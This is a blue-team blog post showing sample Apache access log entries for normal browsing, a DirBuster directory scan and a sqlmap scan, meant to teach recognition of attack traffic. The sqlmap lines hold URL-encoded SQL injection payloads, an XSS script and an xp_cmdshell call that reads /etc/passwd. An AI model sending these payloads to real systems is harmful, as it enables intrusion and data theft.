---
layout: post
title: Log Series 2 APACHE
author: Rayzer0
category: Blue Team
date: 2019-2-11
---

# apache2 - normal(ish) GET requests - /var/log/apache2/access.log
```perl
192.168.56.3 - - [05/Aug/2019:14:32:48 -0400] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
192.168.56.3 - - [05/Aug/2019:14:32:48 -0400] "GET /icons/openlogo-75.png HTTP/1.1" 200 6040 "http://192.168.56.6/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
192.168.56.3 - - [05/Aug/2019:14:32:48 -0400] "GET /favicon.ico HTTP/1.1" 404 503 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
192.168.56.3 - - [05/Aug/2019:14:32:48 -0400] "GET /favicon.ico HTTP/1.1" 404 503 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
192.168.56.3 - - [05/Aug/2019:14:32:55 -0400] "GET /wp-login.php HTTP/1.1" 200 111993 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
192.168.56.3 - - [05/Aug/2019:14:33:28 -0400] "GET /wp-content/images/other/tokyoneon.jpoeg HTTP/1.1" 404 532 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
192.168.56.3 - - [05/Aug/2019:14:33:31 -0400] "GET /wp-content/images/other/tokyoneon.jpeg HTTP/1.1" 200 18264 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
```

# apache2 - dirbuster attack - /var/log/apache2/access.log
## uses "dirbuster" user-agent by default
```perl
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~uucp/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~operator.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~nscd.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~games.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~operator/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~games.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~mailnull.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /icons/~root/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /icons/~root.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /icons/~root.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~gopher.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /icons/~root.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~games/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~gopher.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~ident.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /icons/~toor/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /icons/~toor.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /icons/~toor.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~ftp.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /icons/~toor.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~gopher/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~ftp.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~rpc.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~bin/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~bin.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~bin.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~nobody.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~bin.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~ftp/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~nobody.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~rpcuser.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~daemon/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~daemon.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~daemon.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~nscd.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~daemon.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~nobody/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~nscd.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~xfs.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~adm/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~adm.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~adm.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~mailnull.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~adm.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~nscd/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~mailnull.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
```

# apache2 - sqlmap (injection) - /var/log/apache2/access.log
## uses "SQLmap" as user-agent by default
```perl
192.168.56.3 - - [05/Aug/2019:14:45:04 -0400] "GET /index.php?id=1 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:04 -0400] "GET /index.php?id=1&lPfi=4168%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:04 -0400] "GET /index.php?id=1 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:04 -0400] "GET /index.php?id=9998 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:04 -0400] "GET /index.php?id=1.%28%22%28%29%29.%27.%2C HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%27ZCFDIB%3C%27%22%3EcMHxnM HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%29%20AND%209477%3D5844%20AND%20%283635%3D3635 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%20AND%204078%3D5995 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%20AND%209318%3D9644--%20BHCQ HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%27%29%20AND%207118%3D6823%20AND%20%28%27wMek%27%3D%27wMek HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%27%20AND%203078%3D2826%20AND%20%27msWB%27%3D%27msWB HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=-4151 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=-8628%29%20OR%206606%3D6383%20AND%20%288717%3D8717 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=-9835%29%20OR%203423%3D3423%20AND%20%285501%3D5501 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=-1427%20OR%205770%3D6167 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=-9659%20OR%203423%3D3423 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=-5445%20OR%202069%3D1492--%20UARO HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=-8186%20OR%203423%3D3423--%20lWli HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=-4019%27%29%20OR%202466%3D1029%20AND%20%28%27MRmY%27%3D%27MRmY HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=-5530%27%29%20OR%203423%3D3423%20AND%20%28%27GBQe%27%3D%27GBQe HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=-6837%27%20OR%202804%3D3633%20AND%20%27jrhO%27%3D%27jrhO HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=-1965%27%20OR%203423%3D3423%20AND%20%27dMAm%27%3D%27dMAm HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=%28SELECT%20%28CASE%20WHEN%20%283153%3D2398%29%20THEN%201%20ELSE%20%28SELECT%202398%20UNION%20SELECT%208323%29%20END%29%29 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%29%20AND%20%28SELECT%209800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6271%2C%28SELECT%20%28ELT%289800%3D9800%2C1%29%29%29%2C0x7176767871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%285343%3D5343 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%20AND%20%28SELECT%209800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6271%2C%28SELECT%20%28ELT%289800%3D9800%2C1%29%29%29%2C0x7176767871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%20AND%20%28SELECT%209800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6271%2C%28SELECT%20%28ELT%289800%3D9800%2C1%29%29%29%2C0x7176767871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20Tulp HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%27%29%20AND%20%28SELECT%209800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6271%2C%28SELECT%20%28ELT%289800%3D9800%2C1%29%29%29%2C0x7176767871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%27EmsB%27%3D%27EmsB HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%27%20AND%20%28SELECT%209800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6271%2C%28SELECT%20%28ELT%289800%3D9800%2C1%29%29%29%2C0x7176767871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%27nubz%27%3D%27nubz HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
```
